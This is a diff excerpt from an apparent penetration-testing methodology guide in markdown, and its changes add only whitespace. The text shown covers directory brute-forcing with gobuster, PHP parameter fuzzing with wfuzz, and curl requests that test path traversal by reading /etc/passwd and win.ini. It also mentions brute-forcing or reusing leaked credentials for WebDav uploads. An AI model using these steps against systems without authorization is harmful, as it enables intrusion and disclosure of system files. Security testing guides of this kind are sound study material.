@@ -279,11 +279,14 @@ gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x ph
     > Usually, file upload through WebDav requires a valid credential, which might need to conduct brute force attack or find leaked credentials from other places
 
 - If PHP is used, find a .php endpoint with at least one query parameter OR the certain page is dynamic (such as index.php), proceed to parameter discovery:
+    
     ```bash
     wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt --hc 404 --hl 100 "http://<target_ip>/<target_php>?FUZZ=test"
     ```
+
     The testing returns usable parameters, such as `page`. Do further testing based on them.
     1. Test path traversal: Determine if the parameter allows reading arbitrary files.
+      
       ```bash
       curl "http://<target_ip>/<target_php>?<parameter>=../../../../etc/passwd" # Linux Based Server
       curl "http://<target_ip>/<target_php>?=../../../../windows/win.ini"  # Windows Based Server
